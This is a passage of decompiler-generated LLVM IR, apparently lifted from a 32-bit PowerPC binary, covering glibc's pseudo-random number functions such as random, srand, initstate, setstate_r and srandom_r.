  uselistorder i32 ()* @random, { 36, 33, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 32, 27, 34, 35, 28, 29, 30, 31 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %v2_1001f4f8 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_1001f4f8, i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_10044f88.1241 to i32), i32* @r29, align 4
  %v4_1001f510 = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-52, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10044f88.1241 to i32))
  %v0_1001f514 = load i32, i32* @r29, align 4
  store i32 268563740, i32* @lr, align 4
  %v1_1001f518 = call i32 @pthread_mutex_lock(i32 %v0_1001f514)
  %v2_1001f520 = ptrtoint i32* %stack_var_-56 to i32
  %v3_1001f528 = call i32 @__GI_random_r(i32* inttoptr (i32 268717984 to i32*), i32 %v2_1001f520)
  store i32 %v2_1001f4f8, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268563768, i32* @lr, align 4
  %v0_1001f534 = call i32 @__pthread_cleanup_pop_restore()
  %v3_1001f53c = load i32, i32* %stack_var_-56, align 4
  ret i32 %v3_1001f53c
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_10044f88.1241 to i32), i32* %r29.global-to-local, align 4
  %v2_1001f574 = ptrtoint i32* %stack_var_-40 to i32
  %v4_1001f57c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10044f88.1241 to i32))
  store i32 268563848, i32* @lr, align 4
  %v1_1001f584 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044f88.1241 to i32))
  store i32 268563872, i32* @lr, align 4
  %v3_1001f59c = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_10044fa0)
  store i32 0, i32* %r29.global-to-local, align 4
  %v1_1001f5a4 = icmp slt i32 %v3_1001f59c, 0
  store i32 1, i32* @r4, align 4
  store i32 %v2_1001f574, i32* @r3, align 4
  br i1 %v1_1001f5a4, label %dec_label_pc_1001f5b8, label %dec_label_pc_1001f5b4

dec_label_pc_1001f5b4:                            ; preds = %entry
  store i32 ptrtoint (i32** @global_var_10044fa4.1245 to i32), i32* %r29.global-to-local, align 4
  br label %dec_label_pc_1001f5b8

dec_label_pc_1001f5b8:                            ; preds = %entry, %dec_label_pc_1001f5b4
  store i32 268563900, i32* @lr, align 4
  %v0_1001f5b8 = call i32 @__pthread_cleanup_pop_restore()
  %v0_1001f5c0 = load i32, i32* %r29.global-to-local, align 4
  ret i32 %v0_1001f5c0

; uselistorder directives
  uselistorder i32* %r29.global-to-local, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1001f5b8, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-56 = alloca i32, align 4
  %v2_1001f5e4 = ptrtoint i32* %stack_var_-56 to i32
  %v4_1001f60c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-56, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10044f88.1241 to i32))
  store i32 268563992, i32* @lr, align 4
  %v1_1001f614 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044f88.1241 to i32))
  store i32 %arg1, i32* @r3, align 4
  store i32 268564020, i32* @lr, align 4
  %v4_1001f630 = inttoptr i32 %arg1 to i32*
  %v5_1001f630 = call i32 @__GI_initstate_r(i32* %v4_1001f630, i32 %arg2, i32 %arg3, i32 ptrtoint (i32* @global_var_10044fa0 to i32))
  store i32 %v2_1001f5e4, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268564032, i32* @lr, align 4
  %v0_1001f63c = call i32 @__pthread_cleanup_pop_restore()
  ret i32 ptrtoint (i32** @global_var_10044fa4.1245 to i32)

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-40 = alloca i32, align 4
  %v2_1001f670 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_1001f670, i32* @r27, align 4
  %v4_1001f68c = call i32 @__pthread_cleanup_push_defer(i32* nonnull %stack_var_-40, i32 add (i32 ptrtoint (i32* @global_var_10010000.20 to i32), i32 26856), i32 ptrtoint (i32* @global_var_10044f88.1241 to i32))
  store i32 268564120, i32* @lr, align 4
  %v1_1001f694 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_10044f88.1241 to i32))
  store i32 ptrtoint (i32* @global_var_10044fa0 to i32), i32* @r4, align 4
  store i32 %arg1, i32* @r3, align 4
  store i32 268564136, i32* @lr, align 4
  %v0_1001f6a4 = call i32 @srandom_r()
  store i32 %v2_1001f670, i32* @r3, align 4
  store i32 1, i32* @r4, align 4
  store i32 268564148, i32* @lr, align 4
  %v0_1001f6b0 = call i32 @__pthread_cleanup_pop_restore()
  ret i32 %v0_1001f6b0

; uselistorder directives
  uselistorder i32* @global_var_10044fa0, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10044fa0 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_10044f88.1241 to i32), { 0, 4, 1, 3, 2, 5, 7, 6, 8 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r3.global-to-local, align 4
  %v1_1001f6c8 = add i32 %tmp, 12
  %v2_1001f6c8 = inttoptr i32 %v1_1001f6c8 to i32*
  %v3_1001f6c8 = load i32, i32* %v2_1001f6c8, align 4
  store i32 %v3_1001f6c8, i32* %r11.global-to-local, align 4
  %v0_1001f6cc = load i32, i32* @lr, align 4
  store i32 %v0_1001f6cc, i32* %r0.global-to-local, align 4
  %v1_1001f6d4 = add i32 %arg1, 4
  store i32 %v1_1001f6d4, i32* %r3.global-to-local, align 4
  %v3_1001f6d8 = icmp eq i32 %v3_1001f6c8, 0
  %v1_1001f6dc = add i32 %tmp, 8
  %v2_1001f6dc = inttoptr i32 %v1_1001f6dc to i32*
  %v3_1001f6dc = load i32, i32* %v2_1001f6dc, align 4
  store i32 %v3_1001f6dc, i32* %r9.global-to-local, align 4
  br i1 %v3_1001f6d8, label %dec_label_pc_1001f6e8, label %dec_label_pc_1001f6f0

dec_label_pc_1001f6e8:                            ; preds = %entry
  %v2_1001f6e8 = add i32 %v3_1001f6dc, -4
  %v3_1001f6e8 = inttoptr i32 %v2_1001f6e8 to i32*
  store i32 0, i32* %v3_1001f6e8, align 4
  br label %dec_label_pc_1001f708

dec_label_pc_1001f6f0:                            ; preds = %entry
  %v1_1001f6f0 = add i32 %tmp, 4
  %v2_1001f6f0 = inttoptr i32 %v1_1001f6f0 to i32*
  %v3_1001f6f0 = load i32, i32* %v2_1001f6f0, align 4
  %v2_1001f6f4 = sub i32 %v3_1001f6f0, %v3_1001f6dc
  %v4_1001f6f8 = sdiv i32 %v2_1001f6f4, 4
  %v1_1001f6fc = mul i32 %v4_1001f6f8, 5
  %v2_1001f700 = add i32 %v1_1001f6fc, %v3_1001f6c8
  store i32 %v2_1001f700, i32* %r0.global-to-local, align 4
  %v2_1001f704 = add i32 %v3_1001f6dc, -4
  %v3_1001f704 = inttoptr i32 %v2_1001f704 to i32*
  store i32 %v2_1001f700, i32* %v3_1001f704, align 4
  br label %dec_label_pc_1001f708

dec_label_pc_1001f708:                            ; preds = %dec_label_pc_1001f6e8, %dec_label_pc_1001f6f0
  %v0_1001f708 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001f708 = add i32 %v0_1001f708, -4
  %v2_1001f708 = inttoptr i32 %v1_1001f708 to i32*
  %v3_1001f708 = load i32, i32* %v2_1001f708, align 4
  store i32 5, i32* %r7.global-to-local, align 4
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002f0d4.1246 to i32), i32* %r9.global-to-local, align 4
  %v2_1001f718 = srem i32 %v3_1001f708, 5
  store i32 %v2_1001f718, i32* %r11.global-to-local, align 4
  %v2_1001f728 = icmp ugt i32 %v2_1001f718, 4
  %v1_1001f72c = mul nsw i32 %v2_1001f718, 4
  store i32 %v1_1001f72c, i32* %r0.global-to-local, align 4
  br i1 %v2_1001f728, label %dec_label_pc_1001f798, label %dec_label_pc_1001f73c

dec_label_pc_1001f73c:                            ; preds = %dec_label_pc_1001f708
  %v2_1001f734 = add i32 %v1_1001f72c, ptrtoint (i32* @global_var_1002f0d4.1246 to i32)
  %v3_1001f730 = icmp eq i32 %v2_1001f718, 0
  %v1_1001f73c = add i32 %v1_1001f72c, add (i32 ptrtoint (i32* @global_var_1002f0d4.1246 to i32), i32 20)
  %v2_1001f73c = inttoptr i32 %v1_1001f73c to i32*
  %v3_1001f73c = load i32, i32* %v2_1001f73c, align 4
  store i32 %v3_1001f73c, i32* @r10, align 4
  %v3_1001f740 = inttoptr i32 %v2_1001f734 to i32*
  %v4_1001f740 = load i32, i32* %v3_1001f740, align 4
  store i32 %v4_1001f740, i32* %r9.global-to-local, align 4
  %v1_1001f744 = mul i32 %v3_1001f73c, 4
  store i32 %v1_1001f744, i32* %r0.global-to-local, align 4
  %v2_1001f748 = add i32 %tmp, 16
  %v3_1001f748 = inttoptr i32 %v2_1001f748 to i32*
  store i32 %v3_1001f73c, i32* %v3_1001f748, align 4
  %v0_1001f74c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f74c = add i32 %tmp, 20
  %v3_1001f74c = inttoptr i32 %v2_1001f74c to i32*
  store i32 %v0_1001f74c, i32* %v3_1001f74c, align 4
  %v0_1001f750 = load i32, i32* %r3.global-to-local, align 4
  %v1_1001f750 = load i32, i32* %r0.global-to-local, align 4
  %v2_1001f750 = add i32 %v1_1001f750, %v0_1001f750
  store i32 %v2_1001f750, i32* @r8, align 4
  %v0_1001f754 = load i32, i32* %r11.global-to-local, align 4
  store i32 %v0_1001f754, i32* %v2_1001f6c8, align 4
  br i1 %v3_1001f730, label %dec_label_pc_1001f78c, label %dec_label_pc_1001f75c

dec_label_pc_1001f75c:                            ; preds = %dec_label_pc_1001f73c
  %v0_1001f75c = load i32, i32* %r3.global-to-local, align 4
  %v1_1001f75c = add i32 %v0_1001f75c, -4
  %v2_1001f75c = inttoptr i32 %v1_1001f75c to i32*
  %v3_1001f75c = load i32, i32* %v2_1001f75c, align 4
  %v1_1001f760 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001f760 = sdiv i32 %v3_1001f75c, %v1_1001f760
  %v1_1001f764 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f764 = add i32 %v1_1001f764, %v2_1001f760
  store i32 %v2_1001f764, i32* %r9.global-to-local, align 4
  %v1_1001f768 = mul i32 %v2_1001f760, 4
  %v1_1001f76c = load i32, i32* @r10, align 4
  %v2_1001f76c = sdiv i32 %v2_1001f764, %v1_1001f76c
  store i32 %v2_1001f76c, i32* %r11.global-to-local, align 4
  %v2_1001f770 = add i32 %v1_1001f768, %v0_1001f75c
  store i32 %v2_1001f770, i32* %r0.global-to-local, align 4
  %v2_1001f774 = add i32 %tmp, 4
  %v3_1001f774 = inttoptr i32 %v2_1001f774 to i32*
  store i32 %v2_1001f770, i32* %v3_1001f774, align 4
  %v0_1001f778 = load i32, i32* %r11.global-to-local, align 4
  %v1_1001f778 = load i32, i32* @r10, align 4
  %v2_1001f778 = mul i32 %v1_1001f778, %v0_1001f778
  store i32 %v2_1001f778, i32* %r11.global-to-local, align 4
  %v1_1001f77c = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f77c = sub i32 %v1_1001f77c, %v2_1001f778
  %v1_1001f780 = mul i32 %v2_1001f77c, 4
  %v0_1001f784 = load i32, i32* %r3.global-to-local, align 4
  %v2_1001f784 = add i32 %v1_1001f780, %v0_1001f784
  store i32 %v2_1001f784, i32* %r9.global-to-local, align 4
  store i32 %v2_1001f784, i32* %arg2, align 4
  br label %dec_label_pc_1001f78c

dec_label_pc_1001f78c:                            ; preds = %dec_label_pc_1001f73c, %dec_label_pc_1001f75c
  %v0_1001f78c = load i32, i32* @r8, align 4
  %v2_1001f78c = add i32 %tmp, 24
  %v3_1001f78c = inttoptr i32 %v2_1001f78c to i32*
  store i32 %v0_1001f78c, i32* %v3_1001f78c, align 4
  %v0_1001f790 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1001f790, i32* %v2_1001f6dc, align 4
  %v0_1001f7ac.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1001f7a8

dec_label_pc_1001f798:                            ; preds = %dec_label_pc_1001f708
  %v0_1001f798 = call i32 @__errno_location()
  store i32 %v0_1001f798, i32* %r3.global-to-local, align 4
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_1001f7a0 = inttoptr i32 %v0_1001f798 to i32*
  store i32 22, i32* %v2_1001f7a0, align 4
  store i32 -1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1001f7a8

dec_label_pc_1001f7a8:                            ; preds = %dec_label_pc_1001f78c, %dec_label_pc_1001f798
  %v0_1001f7ac = phi i32 [ %v0_1001f7ac.pre, %dec_label_pc_1001f78c ], [ -1, %dec_label_pc_1001f798 ]
  store i32 %v0_1001f6cc, i32* %r0.global-to-local, align 4
  store i32 %v0_1001f7ac, i32* %r3.global-to-local, align 4
  ret i32 %v0_1001f7ac

; uselistorder directives
  uselistorder i32 %v0_1001f7ac, { 1, 0 }
  uselistorder i32 %v3_1001f73c, { 1, 0, 2 }
  uselistorder i32 %v1_1001f72c, { 2, 1, 0 }
  uselistorder i32 %v2_1001f718, { 3, 0, 2, 1 }
  uselistorder i32 %tmp, { 3, 4, 6, 5, 0, 1, 2 }
  uselistorder i32* %r3.global-to-local, { 1, 8, 2, 3, 6, 4, 5, 7, 0 }
  uselistorder label %dec_label_pc_1001f7a8, { 1, 0 }
  uselistorder label %dec_label_pc_1001f78c, { 1, 0 }
  uselistorder label %dec_label_pc_1001f708, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %v1_1001f7bc = add i32 %tmp, 12
  %v2_1001f7bc = inttoptr i32 %v1_1001f7bc to i32*
  %v3_1001f7bc = load i32, i32* %v2_1001f7bc, align 4
  %v1_1001f7c8 = add i32 %tmp, 8
  %v2_1001f7c8 = inttoptr i32 %v1_1001f7c8 to i32*
  %v3_1001f7c8 = load i32, i32* %v2_1001f7c8, align 4
  store i32 %v3_1001f7c8, i32* %r7.global-to-local, align 4
  %v3_1001f7cc = icmp eq i32 %v3_1001f7bc, 0
  br i1 %v3_1001f7cc, label %dec_label_pc_1001f7d4, label %dec_label_pc_1001f7f0

dec_label_pc_1001f7d4:                            ; preds = %entry
  %v1_1001f7d4 = inttoptr i32 %v3_1001f7c8 to i32*
  %v2_1001f7d4 = load i32, i32* %v1_1001f7d4, align 4
  %v2_1001f7d8 = mul i32 %v2_1001f7d4, 1103515245
  %v1_1001f7dc = add i32 %v2_1001f7d8, 12345
  %v1_1001f7e0 = urem i32 %v1_1001f7dc, -2147483648
  store i32 %v1_1001f7e0, i32* %r9.global-to-local, align 4
  store i32 %v1_1001f7e0, i32* %v1_1001f7d4, align 4
  %v0_1001f7e8 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f7e8 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1001f7e8, i32* %v2_1001f7e8, align 4
  br label %dec_label_pc_1001f844

dec_label_pc_1001f7f0:                            ; preds = %entry
  %v2_1001f7f0 = load i32, i32* %arg1, align 4
  %v1_1001f7f4 = add i32 %tmp, 4
  %v2_1001f7f4 = inttoptr i32 %v1_1001f7f4 to i32*
  %v3_1001f7f4 = load i32, i32* %v2_1001f7f4, align 4
  store i32 %v3_1001f7f4, i32* %r9.global-to-local, align 4
  %v1_1001f7f8 = add i32 %tmp, 24
  %v2_1001f7f8 = inttoptr i32 %v1_1001f7f8 to i32*
  %v3_1001f7f8 = load i32, i32* %v2_1001f7f8, align 4
  %v1_1001f7fc = add i32 %v2_1001f7f0, 4
  store i32 %v1_1001f7fc, i32* @r8, align 4
  %v1_1001f800 = add i32 %v3_1001f7f4, 4
  %v1_1001f804 = inttoptr i32 %v3_1001f7f4 to i32*
  %v2_1001f804 = load i32, i32* %v1_1001f804, align 4
  store i32 %v2_1001f804, i32* %r9.global-to-local, align 4
  %v2_1001f808 = icmp ult i32 %v1_1001f7fc, %v3_1001f7f8
  %v1_1001f810 = inttoptr i32 %v2_1001f7f0 to i32*
  %v2_1001f810 = load i32, i32* %v1_1001f810, align 4
  store i32 %v1_1001f800, i32* @r10, align 4
  %v2_1001f818 = add i32 %v2_1001f810, %v2_1001f804
  %v1_1001f81c = udiv i32 %v2_1001f818, 2
  store i32 %v1_1001f81c, i32* %r9.global-to-local, align 4
  store i32 %v2_1001f818, i32* %v1_1001f810, align 4
  %v0_1001f824 = load i32, i32* %r9.global-to-local, align 4
  %v2_1001f824 = inttoptr i32 %arg2 to i32*
  store i32 %v0_1001f824, i32* %v2_1001f824, align 4
  br i1 %v2_1001f808, label %dec_label_pc_1001f834, label %dec_label_pc_1001f82c

dec_label_pc_1001f82c:                            ; preds = %dec_label_pc_1001f7f0
  %v0_1001f82c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1001f82c, i32* @r8, align 4
  br label %dec_label_pc_1001f83c

dec_label_pc_1001f834:                            ; preds = %dec_label_pc_1001f7f0
  %v2_1001f80c = icmp ult i32 %v1_1001f800, %v3_1001f7f8
  br i1 %v2_1001f80c, label %dec_label_pc_1001f83c, label %dec_label_pc_1001f838

dec_label_pc_1001f838:                            ; preds = %dec_label_pc_1001f834
  %v0_1001f838 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_1001f838, i32* @r10, align 4
  br label %dec_label_pc_1001f83c

dec_label_pc_1001f83c:                            ; preds = %dec_label_pc_1001f834, %dec_label_pc_1001f82c, %dec_label_pc_1001f838
  %v0_1001f83c = load i32, i32* @r10, align 4
  store i32 %v0_1001f83c, i32* %v2_1001f7f4, align 4
  %v0_1001f840 = load i32, i32* @r8, align 4
  store i32 %v0_1001f840, i32* %arg1, align 4
  br label %dec_label_pc_1001f844

dec_label_pc_1001f844:                            ; preds = %dec_label_pc_1001f7d4, %dec_label_pc_1001f83c
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1001f818, { 1, 0 }
  uselistorder i32 %v1_1001f800, { 1, 0 }
  uselistorder i32 %v3_1001f7f4, { 1, 0, 2 }
  uselistorder i32 %v1_1001f7e0, { 1, 0 }
  uselistorder i32 %tmp, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_1001f844, { 1, 0 }
  uselistorder label %dec_label_pc_1001f83c, { 2, 0, 1 }
}

define i32 @srandom_r() local_unnamed_addr {
entry:
  %ctr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v0_1001f84c = load i32, i32* @lr, align 4
  %v0_1001f858 = load i32, i32* @r4, align 4
  store i32 %v0_1001f858, i32* @r30, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_1001f864 = add i32 %v0_1001f858, 12
  %v2_1001f864 = inttoptr i32 %v1_1001f864 to i32*
  %v3_1001f864 = load i32, i32* %v2_1001f864, align 4
  %v2_1001f868 = icmp ugt i32 %v3_1001f864, 4
  br i1 %v2_1001f868, label %dec_label_pc_1001f918, label %dec_label_pc_1001f870

dec_label_pc_1001f870:                            ; preds = %entry
  %v0_1001f870 = load i32, i32* @r3, align 4
  %v3_1001f870 = icmp eq i32 %v0_1001f870, 0
  %v1_1001f874 = add i32 %v0_1001f858, 8
  %v2_1001f874 = inttoptr i32 %v1_1001f874 to i32*
  %v3_1001f874 = load i32, i32* %v2_1001f874, align 4
  store i32 %v3_1001f874, i32* @r10, align 4
  br i1 %v3_1001f870, label %dec_label_pc_1001f87c, label %dec_label_pc_1001f880

dec_label_pc_1001f87c:                            ; preds = %dec_label_pc_1001f870
  store i32 1, i32* @r3, align 4
  br label %dec_label_pc_1001f880

dec_label_pc_1001f880:                            ; preds = %dec_label_pc_1001f870, %dec_label_pc_1001f87c
  %v0_1001f884 = phi i32 [ %v0_1001f870, %dec_label_pc_1001f870 ], [ 1, %dec_label_pc_1001f87c ]
  %v3_1001f880 = icmp eq i32 %v3_1001f864, 0
  %v2_1001f884 = inttoptr i32 %v3_1001f874 to i32*
  store i32 %v0_1001f884, i32* %v2_1001f884, align 4
  br i1 %v3_1001f880, label %dec_label_pc_1001f914, label %dec_label_pc_1001f88c

dec_label_pc_1001f88c:                            ; preds = %dec_label_pc_1001f880
  %v0_1001f88c = load i32, i32* @r30, align 4
  %v1_1001f88c = add i32 %v0_1001f88c, 16
  %v2_1001f88c = inttoptr i32 %v1_1001f88c to i32*
  %v3_1001f88c = load i32, i32* %v2_1001f88c, align 4
  store i32 %v3_1001f88c, i32* %r11.global-to-local, align 4
  store i32 127773, i32* @r8, align 4
  store i32 2147483647, i32* %r7.global-to-local, align 4
  %v0_1001f8a4 = load i32, i32* @r10, align 4
  store i32 %v3_1001f88c, i32* %ctr.global-to-local, align 4
  %tmp18 = icmp sgt i32 %v3_1001f88c, 0
  br i1 %tmp18, label %dec_label_pc_1001f8e0.preheader, label %dec_label_pc_1001f8e0.preheader.thread

dec_label_pc_1001f8e0.preheader.thread:           ; preds = %dec_label_pc_1001f88c
  store i32 1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1001f8e4

dec_label_pc_1001f8e0.preheader:                  ; preds = %dec_label_pc_1001f88c
  %v1_1001f8e02 = add i32 %v3_1001f88c, -1
  store i32 %v1_1001f8e02, i32* %ctr.global-to-local, align 4
  %v2_1001f8e03 = icmp eq i32 %v1_1001f8e02, 0
  br i1 %v2_1001f8e03, label %dec_label_pc_1001f8e4, label %dec_label_pc_1001f8bc

dec_label_pc_1001f8bc:                            ; preds = %dec_label_pc_1001f8e0.preheader, %dec_label_pc_1001f8dc.dec_label_pc_1001f8bc_crit_edge
  %v1_1001f8dc = phi i32 [ %v2_1001f8dc, %dec_label_pc_1001f8dc.dec_label_pc_1001f8bc_crit_edge ], [ %v0_1001f8a4, %dec_label_pc_1001f8e0.preheader ]
  %v1_1001f8bc = phi i32 [ %v1_1001f8bc.pre, %dec_label_pc_1001f8dc.dec_label_pc_1001f8bc_crit_edge ], [ 127773, %dec_label_pc_1001f8e0.preheader ]
  %v0_1001f8bc = load i32, i32* @r3, align 4
  %v2_1001f8bc = sdiv i32 %v0_1001f8bc, %v1_1001f8bc
  %v2_1001f8c0 = mul i32 %v2_1001f8bc, %v1_1001f8bc
  %v2_1001f8c4 = sub i32 %v0_1001f8bc, %v2_1001f8c0
  %v1_1001f8c8 = mul i32 %v2_1001f8bc, 2836
  store i32 %v1_1001f8c8, i32* %r0.global-to-local, align 4
  %v1_1001f8cc = mul i32 %v2_1001f8c4, 16807
  %v2_1001f8d0 = sub i32 %v1_1001f8cc, %v1_1001f8c8
  store i32 %v2_1001f8d0, i32* @r3, align 4
  %tmp19 = icmp sgt i32 %v2_1001f8d0, -1
  br i1 %tmp19, label %dec_label_pc_1001f8dc, label %dec_label_pc_1001f8d8

dec_label_pc_1001f8d8:                            ; preds = %dec_label_pc_1001f8bc
  %v1_1001f8d8 = load i32, i32* %r7.global-to-local, align 4
  %v2_1001f8d8 = add i32 %v1_1001f8d8, %v2_1001f8d0
  store i32 %v2_1001f8d8, i32* @r3, align 4
  br label %dec_label_pc_1001f8dc

dec_label_pc_1001f8dc:                            ; preds = %dec_label_pc_1001f8bc, %dec_label_pc_1001f8d8
  %v0_1001f8dc = phi i32 [ %v2_1001f8d0, %dec_label_pc_1001f8bc ], [ %v2_1001f8d8, %dec_label_pc_1001f8d8 ]
  %v2_1001f8dc = add i32 %v1_1001f8dc, 4
  %v3_1001f8dc = inttoptr i32 %v2_1001f8dc to i32*
  store i32 %v0_1001f8dc, i32* %v3_1001f8dc, align 4
  %v0_1001f8e0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1001f8e0 = add i32 %v0_1001f8e0, -1
  store i32 %v1_1001f8e0, i32* %ctr.global-to-local, align 4
  %v2_1001f8e0 = icmp eq i32 %v1_1001f8e0, 0
  br i1 %v2_1001f8e0, label %dec_label_pc_1001f8e0.dec_label_pc_1001f8e4_crit_edge, label %dec_label_pc_1001f8dc.dec_label_pc_1001f8bc_crit_edge

dec_label_pc_1001f8dc.dec_label_pc_1001f8bc_crit_edge: ; preds = %dec_label_pc_1001f8dc
  %v1_1001f8bc.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1001f8bc

dec_label_pc_1001f8e0.dec_label_pc_1001f8e4_crit_edge: ; preds = %dec_label_pc_1001f8dc
  %v0_1001f8e4.pre = load i32, i32* @r30, align 4
  %v0_1001f8e8.pre = load i32, i32* %r11.global-to-local, align 4
  %v0_1001f8ec.pre = load i32, i32* @r10, align 4
  br label %dec_label_pc_1001f8e4

dec_label_pc_1001f8e4:                            ; preds = %dec_label_pc_1001f8e0.preheader.thread, %dec_label_pc_1001f8e0.dec_label_pc_1001f8e4_crit_edge, %dec_label_pc_1001f8e0.preheader
  %v0_1001f8ec = phi i32 [ %v0_1001f8ec.pre, %dec_label_pc_1001f8e0.dec_label_pc_1001f8e4_crit_edge ], [ %v0_1001f8a4, %dec_label_pc_1001f8e0.preheader ], [ %v0_1001f8a4, %dec_label_pc_1001f8e0.preheader.thread ]
  %v0_1001f8e8 = phi i32 [ %v0_1001f8e8.pre, %dec_label_pc_1001f8e0.dec_label_pc_1001f8e4_crit_edge ], [ %v3_1001f88c, %dec_label_pc_1001f8e0.preheader ], [ %v3_1001f88c, %dec_label_pc_1001f8e0.preheader.thread ]
  %v1_1001f8ec = phi i32 [ %v0_1001f8e4.pre, %dec_label_pc_1001f8e0.dec_label_pc_1001f8e4_crit_edge ], [ %v0_1001f88c, %dec_label_pc_1001f8e0.preheader ], [ %v0_1001f88c, %dec_label_pc_1001f8e0.preheader.thread ]
  %v1_1001f8e4 = add i32 %v1_1001f8ec, 20
  %v2_1001f8e4 = inttoptr i32 %v1_1001f8e4 to i32*
  %v3_1001f8e4 = load i32, i32* %v2_1001f8e4, align 4
  store i32 %v3_1001f8e4, i32* %r0.global-to-local, align 4
  %v1_1001f8e8 = mul i32 %v0_1001f8e8, 10
  store i32 %v1_1001f8e8, i32* %r31.global-to-local, align 4
  %v2_1001f8ec = add i32 %v1_1001f8ec, 4
  %v3_1001f8ec = inttoptr i32 %v2_1001f8ec to i32*
  store i32 %v0_1001f8ec, i32* %v3_1001f8ec, align 4
  %v0_1001f8f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_1001f8f0 = mul i32 %v0_1001f8f0, 4
  %v0_1001f8f4 = load i32, i32* @r10, align 4
  %v2_1001f8f4 = add i32 %v0_1001f8f4, %v1_1001f8f0
  store i32 %v2_1001f8f4, i32* %r0.global-to-local, align 4
  %v1_1001f8f8 = load i32, i32* @r30, align 4
  %v2_1001f8f8 = inttoptr i32 %v1_1001f8f8 to i32*
  store i32 %v2_1001f8f4, i32* %v2_1001f8f8, align 4
  %v2_1001f90c = ptrtoint i32* %stack_var_-24 to i32
  %v0_1001f90421 = load i32, i32* %r31.global-to-local, align 4
  %v1_1001f90422 = add i32 %v0_1001f90421, -1
  store i32 %v1_1001f90422, i32* @r31, align 4
  %tmp2025 = icmp sgt i32 %v1_1001f90422, -1
  br i1 %tmp2025, label %dec_label_pc_1001f900, label %dec_label_pc_1001f914

dec_label_pc_1001f900:                            ; preds = %dec_label_pc_1001f8e4, %dec_label_pc_1001f900
  %v0_1001f90826 = load i32, i32* @r30, align 4
  %v2_1001f900 = inttoptr i32 %v0_1001f90826 to i32*
  %v3_1001f900 = call i32 @__GI_random_r(i32* %v2_1001f900, i32 %v2_1001f90c)
  %v0_1001f904 = load i32, i32* @r31, align 4
  %v1_1001f904 = add i32 %v0_1001f904, -1
  store i32 %v1_1001f904, i32* @r31, align 4
  %tmp20 = icmp sgt i32 %v1_1001f904, -1
  br i1 %tmp20, label %dec_label_pc_1001f900, label %dec_label_pc_1001f914

dec_label_pc_1001f914:                            ; preds = %dec_label_pc_1001f8e4, %dec_label_pc_1001f900, %dec_label_pc_1001f880
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1001f918

dec_label_pc_1001f918:                            ; preds = %entry, %dec_label_pc_1001f914
  %v0_1001f918 = phi i32 [ -1, %entry ], [ 0, %dec_label_pc_1001f914 ]
  store i32 %v0_1001f84c, i32* %r0.global-to-local, align 4
